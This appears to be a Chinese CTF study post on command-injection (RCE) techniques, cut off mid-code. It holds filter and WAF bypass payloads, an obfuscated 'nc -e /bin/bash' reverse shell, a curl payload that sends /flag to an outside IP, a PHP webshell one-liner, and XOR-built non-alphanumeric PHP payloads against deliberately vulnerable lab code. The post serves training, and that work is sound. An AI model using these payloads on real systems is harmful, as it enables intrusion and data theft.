</p><blockquote><p>当有几个命令要连续执行时，我们可以把它们放在一行内，中间用;分开。</p></blockquote><p><strong>`（反引号）</strong></p><blockquote><p>命令替代，大部分Unix shell以及编程语言如Perl、PHP以及Ruby等都以成对的重音符（反引号）作指令替代，意思是以某一个指令的输出结果作为另一个指令的输入项。 </p></blockquote><p><strong>()指令群组</strong> </p><blockquote><p>格式为：（command1;command2[;command3…]）</p></blockquote><p><img src="/2020/04/30/best-rce/1.png" alt="示例">    </p><h2 id="1-3-Linux-shell通配符-glob模式"><a href="#1-3-Linux-shell通配符-glob模式" class="headerlink" title="1.3 Linux shell通配符/glob模式"></a>1.3 Linux shell通配符/glob模式</h2><blockquote><p>glob 模式（globbing）也被称之为 shell 通配符，名字的起源来自于 Unix V6 中的 <code>/etc/glob</code> （详见 man 文档）。glob 是一种特殊的模式匹配，最常见的是通配符拓展，也可以将 glob 模式设为精简了的正则表达式，在最新的  CentOS 7 中已经删除了 glob 的相关描述文档，删除的原因由于 glob 已经整合到了 shell 之中，然后就有了 shell  通配符。<strong>shell 通配符 / glob 模式通常用来匹配目录以及文件，而不是文本！！！</strong> </p></blockquote><h3 id="1-3-1-语法"><a href="#1-3-1-语法" class="headerlink" title="1.3.1 语法"></a>1.3.1 语法</h3><table><thead><tr><th>字符</th><th>解释</th></tr></thead><tbody><tr><td>*</td><td>匹配任意长度任意字符</td></tr><tr><td>?</td><td>匹配任意单个字符</td></tr><tr><td>[list]</td><td>匹配指定范围内（list）任意单个字符，也可以是单个字符组成的集合</td></tr><tr><td>[^list]</td><td>匹配指定范围外的任意单个字符或字符集合</td></tr><tr><td>[!list]</td><td>同<code>[^list]</code></td></tr><tr><td>{str1,str2,…}</td><td>匹配 srt1 或者 srt2 或者更多字符串，也可以是集合</td></tr><tr><td>IFS</td><td>由 &lt; space &gt; 或 &lt; tab &gt; 或 &lt; enter &gt; 三者之一组成</td></tr><tr><td>CR</td><td>由 &lt; enter &gt; 产生</td></tr><tr><td>!</td><td>执行 history 中的命令</td></tr></tbody></table><p>以及还有专用字符集</p><table><thead><tr><th>字符</th><th>意义</th></tr></thead><tbody><tr><td>[:alnum:]</td><td>任意数字或者字母</td></tr><tr><td>[:alpha:]</td><td>任意字母</td></tr><tr><td>[:space:]</td><td>空格</td></tr><tr><td>[:lower:]</td><td>小写字母</td></tr><tr><td>[:digit:]</td><td>任意数字</td></tr><tr><td>[:upper:]</td><td>任意大写字母</td></tr><tr><td>[:cntrl:]</td><td>控制符</td></tr><tr><td>[:graph:]</td><td>图形</td></tr><tr><td>[:print:]</td><td>可打印字符</td></tr><tr><td>[:punct:]</td><td>标点符号</td></tr><tr><td>[:xdigit:]</td><td>十六进制数</td></tr><tr><td>[:blank:]</td><td>空白字符</td></tr></tbody></table><ul><li>在使用专属字符集的时候，字符集之外还需要用 [ ] 来包含住，否则专用字符集不会生效，例如<code>[[:space:]]</code></li><li>想要转义的时候，单引号与双引号使用方法是不同的，单引号会转义所有字符，而且单引号中间不允许再出现单引号，双引号允许出现特定的 shell 元字符，具体字符可以自行查询</li><li>在使用花括号 {} 的时候，里面的单个字符串需要使用单引号或者双引号括住，否则就会视为多个的单个字符</li></ul><h3 id="1-3-2-应用实例"><a href="#1-3-2-应用实例" class="headerlink" title="1.3.2 应用实例"></a>1.3.2 应用实例</h3><pre class="line-numbers language-powershell"><code class="language-powershell">$ <span class="token function">cat</span> <span class="token operator">/</span><span class="token function">fl</span>??flag<span class="token punctuation">{</span>xxx<span class="token punctuation">}</span><span class="token comment" spellcheck="true"># 存在文件 a.txt 和 b.txt 和 c.txt 和 ab.txt</span>$ <span class="token function">ls</span> <span class="token namespace">[ab]</span><span class="token punctuation">.</span>txta<span class="token punctuation">.</span>txt b<span class="token punctuation">.</span>txt$ <span class="token function">ls</span> <span class="token operator">*</span><span class="token namespace">[ab]</span><span class="token punctuation">.</span>txtab<span class="token punctuation">.</span>txt a<span class="token punctuation">.</span>txt b<span class="token punctuation">.</span>txt$ <span class="token function">ls</span> <span class="token namespace">[a-c]</span><span class="token punctuation">.</span>txta<span class="token punctuation">.</span>txt b<span class="token punctuation">.</span>txt c<span class="token punctuation">.</span>txt$ <span class="token function">ls</span> <span class="token operator">*</span><span class="token namespace">[a-c]</span><span class="token punctuation">.</span>txta<span class="token punctuation">.</span>txt ab<span class="token punctuation">.</span>txt abc<span class="token punctuation">.</span>txt b<span class="token punctuation">.</span>txt c<span class="token punctuation">.</span>txt$ <span class="token function">echo</span> d<span class="token punctuation">{</span>a<span class="token punctuation">,</span>e<span class="token punctuation">,</span>i<span class="token punctuation">,</span>u<span class="token punctuation">,</span>o<span class="token punctuation">}</span>gdag deg dig dug dog<span class="token comment" spellcheck="true">#  大括号可以嵌套使用</span>$ <span class="token function">echo</span> <span class="token punctuation">{</span>j<span class="token punctuation">{</span>p<span class="token punctuation">,</span>pe<span class="token punctuation">}</span>g<span class="token punctuation">,</span>png<span class="token punctuation">}</span>jpg jpeg png<span class="token comment" spellcheck="true">#  {start..end}匹配连续字符</span>$ <span class="token function">cat</span> <span class="token operator">/</span>f<span class="token punctuation">{</span>0<span class="token punctuation">.</span><span class="token punctuation">.</span>z<span class="token punctuation">}</span>agflag<span class="token punctuation">{</span>xxxxx<span class="token punctuation">}</span>$ <span class="token function">echo</span> d<span class="token punctuation">{</span>a<span class="token punctuation">.</span><span class="token punctuation">.</span>z<span class="token punctuation">}</span>gdag dbg dcg ddg deg dfg dgg dhg dig djg dkg dlg dmg dng dog dpg dqg drg dsg dtg dug dvg dwg dxg dyg dzg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="1-4-常用绕过"><a href="#1-4-常用绕过" class="headerlink" title="1.4 常用绕过"></a>1.4 常用绕过</h2><h3 id="1-4-1-命令分隔与执行多条命令"><a href="#1-4-1-命令分隔与执行多条命令" class="headerlink" title="1.4.1  命令分隔与执行多条命令"></a>1.4.1  命令分隔与执行多条命令</h3><pre><code># Unix%0a（%0a前后要留有空格）$ cat /flag %0a cat /flagflag{123}cat: %0a: No such file or directorycat: cat: No such file or directoryflag{123}-----------------------------------------------------------------------------------------%0d（%0d前后要留有空格）$ cat /flag %0d cat /flagflag{123}cat: %0d: No such file or directorycat: cat: No such file or directoryflag{123}-----------------------------------------------------------------------------------------;$ cat /flag;cat /flagflag{123}flag{123}-----------------------------------------------------------------------------------------&amp;$ cat /flag&amp;cat /flag[1] 53065flag{123}flag{123}[1]+  Done                    cat /flag-----------------------------------------------------------------------------------------|和||$ cat /flag|cat /flagflag{123}$ cat /flag||cat /flagflag{123}-----------------------------------------------------------------------------------------$(shell_command)`shell_command`;{ shell_command,}左花括号与命令之间必须有空格！！！$(cat /flag)`cat /flag`;{ cat /flag;}flag{123}flag{123}: command not foundflag{123}</code></pre><h3 id="1-4-2-空格绕过"><a href="#1-4-2-空格绕过" class="headerlink" title="1.4.2  空格绕过"></a>1.4.2  空格绕过</h3><pre><code># 使用&lt;或&gt;$ cat&lt;/flag    flag{xxxxx}$ cat&lt;&gt;/flag  flag{xxxxx}-----------------------------------------------------------------------------------------# 使用IFS$ cat$IFS$9/flag  flag{xxxx}$ cat${IFS}/flag  flag{xxxxx}$ cat$IFS/flag  flag{xxxxx}-----------------------------------------------------------------------------------------# 使用url的编码绕过%20(space)%09(tab)%3c(&lt;)+-----------------------------------------------------------------------------------------# 变量控制(这个地方不太懂)$ X=$&#39;cat\x20/flag&#39;&amp;&amp;$X  flag{xxxxx}$ X=$&#39;cat\x09/flag&#39;&amp;&amp;$X  flag{xxxxx}-----------------------------------------------------------------------------------------采用$@绕过$ c$@at /fl$@ag  flag{xxx}$ echo i$@d  id$ echo i$@d|$0   uid=0(root) gid=0(root) groups=0(root)</code></pre><h3 id="1-4-3-黑名单绕过"><a href="#1-4-3-黑名单绕过" class="headerlink" title="1.4.3 黑名单绕过"></a>1.4.3 黑名单绕过</h3><pre><code># 采用变量a=l;b=s;$a$ba=c;b=at;c=flag;$a$b $c# 编码绕过--------------------------------------base64---------------------------------------------echo &quot;Y2F0IC9mbGFn&quot;|base64 -d|bashecho &quot;Y2F0IC9mbGFn&quot;|base64 -d|sh也可以把双引号去掉,空格用$IFS替换，如果是echo之类的后面跟有参数并有空格，$IFS后面还要加一个$1echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS-d|sh-----------------------------------------hex---------------------------------------------echo &quot;636174202f666c6167&quot;|xxd -r -p|bashflag{123}xxd -hUsage:    -r          reverse operation: convert (or patch) hexdump into binary.xxd -pglzjin676c7a6a696e0a-----------------------------------------\x----------------------------------------------$(cat /flag)flag{123}: command not found$(printf &quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;)flag{123}{printf,&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;}|$0flag{123}{printf,&quot;\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76&quot;} &gt;&gt; 1.phpcat 1.php&lt;?php @eval($_POST[&#39;c&#39;]);?&gt;#符号绕过-------------------------------------------引号-------------------------------------------c&quot;a&quot;t /f&#39;&#39;l&#39;a&#39;gflag{123}-----------------------------------------反斜线-------------------------------------------c\a\t /f\l\agflag{xxx}#利用已经存在的资源echo $PATH/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binecho $PATH | cut -c 1/可用于绕过/过滤cat `echo $PATH|cut -c 1`flagflag{xxx}-----------------------------------------------------------------------------------------root@kali:# {cat,/etc/passwd}root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/uroot@kali:~/rsshub/dist# test=/ehhh/hmtc/pahhh/hmsswdroot@kali:~/rsshub/dist# cat ${test//hh??hm/}root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinroot@kali:/# test=/fhhh/hmlagroot@kali:/# cat ${test//hh??hm/}flag{Decadenbnbnbnb}大招root@kali:/#g=&quot;/e&quot;\h&quot;hh&quot;/hm&quot;t&quot;c/\i&quot;sh&quot;hh/hmsu\e;tac$@&lt;${g//hh??hm/}Kali GNU/Linux Rolling \n \l------------------------------------------反引号------------------------------------------cat$IFS$1`ls$IFS$1-a`</code></pre><h2 id="1-5-Web应用防火墙绕过技巧"><a href="#1-5-Web应用防火墙绕过技巧" class="headerlink" title="1.5  Web应用防火墙绕过技巧"></a>1.5  Web应用防火墙绕过技巧</h2><p><strong>使用通配符绕过防火墙规则</strong></p><pre><code>nc -e /bin/bash ip portroot@kali:/# n? -e /???/b??h 127.0.0.1 6666root@kali:/# nc -lvp 6666*listening on [any] 6666 ...connect to [127.0.0.1] from localhost [127.0.0.1] 40004iduid=0(root) gid=0(root) 组=0(root)whoamiroot</code></pre><p><strong>使用字符串拼接绕过防火墙规则</strong></p><pre><code>root@kali:/# /&#39;b&#39;i&#39;&#39;n/&#39;c&#39;&#39;a&#39;t /e&#39;t&#39;c/p&#39;&#39;as&#39;&#39;sw&#39;d&#39;root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologin</code></pre><p><strong>使用curl -d参数读取本地文件</strong></p><pre><code>curl -d @/etc/passwd 127.0.0.1:6000</code></pre><h2 id="1-6-rce函数"><a href="#1-6-rce函数" class="headerlink" title="1.6  rce函数"></a>1.6  rce函数</h2><p>exec、shell_exec、`` 在php执行完shell命令后需要echo才有输出，如果用system也会有输出，并且system函数的输入可以不要双引号。</p><pre><code>&lt;?php`dir`;//无回显?&gt;-----------------------------------------------------------------------------------------&lt;?phpecho `dir`;//有回显?&gt;-----------------------------------------------------------------------------------------&lt;?phpsystem(&quot;dir&quot;);//有回显//system(dir);//也可上面这样?&gt;</code></pre><h1 id="2-rce进阶"><a href="#2-rce进阶" class="headerlink" title="2  rce进阶"></a>2  rce进阶</h1><h2 id="2-1-特殊的rce"><a href="#2-1-特殊的rce" class="headerlink" title="2.1  特殊的rce"></a>2.1  特殊的rce</h2><h3 id="2-1-1-命令执行没回显"><a href="#2-1-1-命令执行没回显" class="headerlink" title="2.1.1  命令执行没回显"></a>2.1.1  命令执行没回显</h3><p><strong>题目链接：</strong><a href="http://106.54.129.202:25502/test_rce/blind_rce/" target="_blank" rel="noopener">http://106.54.129.202:25502/test_rce/blind_rce/</a></p><p><strong>参考资料：</strong></p><p><strong>1、</strong>命令执行没回显  <a href="http://www.manongjc.com/detail/14-psivilbdbxqvkta.html" target="_blank" rel="noopener">http://www.manongjc.com/detail/14-psivilbdbxqvkta.html</a></p><p><strong>2、</strong>Time_Based_RCE  <a href="https://skysec.top/2017/12/29/Time-Based-RCE/" target="_blank" rel="noopener">https://skysec.top/2017/12/29/Time-Based-RCE/</a></p><p><strong>3、</strong>Linux如何在一个文件中写入内容  <a href="https://www.cnblogs.com/ConnorShip/p/10284802.html" target="_blank" rel="noopener">https://www.cnblogs.com/ConnorShip/p/10284802.html</a></p><pre><code>&lt;?php  highlight_file(__FILE__);$cmd=$_GET[&#39;cmd&#39;];`$cmd`;?&gt;</code></pre><p><strong>解法一：</strong></p><p>反弹shell</p><p><strong>解法二：（写一个一句话木马）</strong></p><p>没有成功，后台写不了，用反弹shell去看了下</p><p><img src="/2020/04/30/best-rce/5.png" alt="Permission denied"></p><pre><code>echo &quot;&lt;?php @eval($_POST[&#39;a&#39;]);?&gt;&quot; &gt; shell.php</code></pre><h3 id="2-1-2-curl任意读取"><a href="#2-1-2-curl任意读取" class="headerlink" title="2.1.2  curl任意读取"></a>2.1.2  curl任意读取</h3><p><strong>题目链接：</strong><a href="http://106.54.129.202:25502/test_rce/exec/exec4-curl.php" target="_blank" rel="noopener">http://106.54.129.202:25502/test_rce/exec/exec4-curl.php</a></p><p><strong>参考资料：</strong></p><p><strong>1、</strong>学习笔记之 curl 命令用法详解  <a href="https://www.cnblogs.com/doseoer/p/7044344.html" target="_blank" rel="noopener">https://www.cnblogs.com/doseoer/p/7044344.html</a></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$urlInfo</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token string">"http"</span> <span class="token operator">===</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$urlInfo</span><span class="token punctuation">[</span><span class="token string">"scheme"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token string">"https"</span><span class="token operator">===</span><span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$urlInfo</span><span class="token punctuation">[</span><span class="token string">"scheme"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span> <span class="token string">"scheme error!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token variable">$url</span><span class="token operator">=</span><span class="token function">escapeshellarg</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span><span class="token operator">=</span><span class="token function">escapeshellcmd</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"curl "</span><span class="token punctuation">.</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>payload：</strong></p><pre><code>?url=http://baidu.com/ &#39; -F file=@/flag -x 47.112.158.20:10110</code></pre><p><img src="/2020/04/30/best-rce/6.png" alt="result"></p><p>这道题考察的知识点很是庞大，盘点下存在的坑：</p><p><strong>1、</strong><code>http://baidu.com/</code>   最后一个/一定要加上去，不然parse_url会报错，导致通不过校验。</p><p><strong>2、</strong>-F 后面要加file=</p><p><strong>3、</strong>@符号也不能少，curl -x 相当于走代理，curl -F 相当于上传文件，而@后面加上字符串就相当于是文件名。</p><h3 id="2-1-3-0a换行符"><a href="#2-1-3-0a换行符" class="headerlink" title="2.1.3  %0a换行符"></a>2.1.3  %0a换行符</h3><p><strong>题目链接：</strong><a href="http://106.54.129.202:25502/test_rce/rce_path/rce_path.php" target="_blank" rel="noopener">http://106.54.129.202:25502/test_rce/rce_path/rce_path.php</a></p><p><strong>参考资料：</strong></p><p>1、</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"path"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/^[a-zA-Z0-9\s_]+.rpt$/m"</span><span class="token punctuation">,</span> <span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"regex failed"</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"/usr/bin/file -i -b "</span> <span class="token punctuation">.</span> <span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//echo exec("ls -al | grep " . $file_name);</span>  <span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>payload：</strong></p><pre><code>?path=1.rpt%0acat%20/flag</code></pre><p> <code>/m（mutiple）</code>多行查找<br>m 影响 <code>^、$</code>。<br>若不指定 m，则：<code>^</code> 只在字符串的最开头，<code>$</code> 只在字符串的最结尾。即：匹配整个串的开始和结束。<br>若指定 m，则：<code>^</code>在字符串每一行的开头，<code>$</code> 在字符串每一行的结尾。即：匹配每一行的开始和结束。</p><p>可以使用%0a换行符绕过检验。</p><h3 id="2-1-4-无数字字母rce"><a href="#2-1-4-无数字字母rce" class="headerlink" title="2.1.4  无数字字母rce"></a>2.1.4  无数字字母rce</h3><h4 id="2-1-4-1-rce1"><a href="#2-1-4-1-rce1" class="headerlink" title="2.1.4.1  rce1"></a>2.1.4.1  rce1</h4><p><strong>题目链接：</strong><a href="http://106.54.129.202:25502/test_rce/jixianliyong1" target="_blank" rel="noopener">http://106.54.129.202:25502/test_rce/jixianliyong1</a></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string">'flag.php'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">40</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Long."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/[A-Za-z0-9]+/"</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"NO."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>    @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//$hint =  "php function getFlag() to get flag";</span><span class="token comment" spellcheck="true">//payload1:</span><span class="token comment" spellcheck="true">//?code=$_="]@(:,=:"^":%\|@\]";$_();</span><span class="token comment" spellcheck="true">//payload2:</span><span class="token comment" spellcheck="true">//?code=$_="`{{{"^"?&lt;>/";${$_}[_](${$_}[__]);&amp;_=assert&amp;__=getFlag();</span><span class="token comment" spellcheck="true">//相当于：?code=$_=$_GET;$_GET[_]($_GET[__]);&amp;_=assert&amp;__=getFlag();</span><span class="token delimiter">?></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>构造无数字字母rce：</strong></p><p>利用可见字符之间异或的方式，绕过正则的限定条件，但面对太过复杂的限制条件，仅依赖可见字符就行不通了。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string">'getFlag'</span><span class="token punctuation">;</span><span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">str_split</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$flag1</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span><span class="token variable">$flag2</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span><span class="token variable">$black_list</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"'"</span><span class="token punctuation">,</span><span class="token string">";"</span><span class="token punctuation">,</span><span class="token string">"_"</span><span class="token punctuation">,</span><span class="token string">"`"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//这些字符为黑名单</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$content</span> <span class="token keyword">as</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token function">random_int</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">126</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$j</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token operator">^</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token function">strval</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$black_list</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">,</span> <span class="token variable">$black_list</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">31</span> <span class="token operator">&amp;</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/[A-Za-z0-9]+/"</span><span class="token punctuation">,</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/[A-Za-z0-9]+/"</span><span class="token punctuation">,</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   <span class="token comment" spellcheck="true">//此处填入题目限制条件</span>                    <span class="token variable">$flag1</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token variable">$flag2</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token variable">$j</span><span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string">'"%s"^"%s"'</span><span class="token punctuation">,</span><span class="token variable">$flag1</span><span class="token punctuation">,</span><span class="token variable">$flag2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2020/04/30/best-rce/7.png" alt="rce"></p><h4 id="2-1-4-2-rce2"><a href="#2-1-4-2-rce2" class="headerlink" title="2.1.4.2  rce2"></a>2.1.4.2  rce2</h4><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>_<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>脚本：</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$l</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span><span class="token variable">$r</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span><span class="token variable">$argv</span> <span class="token operator">=</span> <span class="token function">str_split</span><span class="token punctuation">(</span><span class="token string">"_GET"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$argv</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>       <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$j</span><span class="token operator">&lt;</span><span class="token number">255</span><span class="token punctuation">;</span><span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$k</span> <span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token 